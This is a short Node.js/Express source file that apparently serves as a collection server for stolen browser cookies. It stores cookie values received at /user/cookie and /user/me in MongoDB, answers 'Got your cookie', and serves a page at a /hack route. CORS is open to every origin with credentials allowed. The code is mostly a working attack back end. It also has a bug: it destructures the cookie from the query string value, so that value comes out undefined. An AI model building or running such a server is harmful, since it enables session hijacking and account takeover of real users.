const express = require("express");
const path = require("path");
const mongoose = require("mongoose");
const cors = require("cors");

const app = express();
app.use(express.json());
const corsOptions = {
    origin: '*', // Allow requests only from this origin
    methods: 'GET,POST', // Allow only these methods
    credentials:true
}
app.use(cors(corsOptions));

const DB_URI = "mongodb://localhost:27017/testing";

mongoose.connect(DB_URI,{}).then((conn)=>{
    console.log(`database connected to ${conn.connection.host}`);
}).catch((err)=>{
    console.log(`Error occured ${err}`);
})

const userSchema = new mongoose.Schema({
    cookie:String
});

const User = mongoose.model("User",userSchema);

const userController = async(req,res) => {
    try{
        const {cookie} = req.body;
        await User.create({cookie});
        console.log(`created sucessfully cookie ${cookie} `);
        res.status(200).json({
            success:true,
            message:"successfull"
        })
    }catch(err){
        console.log(err);
        res.status(500).json({
            success:false,
            message:"Internal server error "
        })
    }
}



app.get("/hack",(req,res)=>{
    res.sendFile(path.join(__dirname,'index.html'));
})

const router = express.Router();

const getUserCookie = async(req,res) => {
    try{
        const {cookie} = req.query.cookie;
        console.log(cookie);
        await User.create({cookie});
        res.status(200).json({
            success:true,
            message:"Got your cookie "
        })

    }catch(err){
        res.status(500).json({
            success:false,
            message:"Internal sever error "
        })
    }
}

router.route("/me").get(getUserCookie);
router.route("/cookie").post(userController);

app.use("/user",router);

const PORT=4500;

app.listen(PORT,()=>{
    console.log(`server is running ${PORT}`)
})
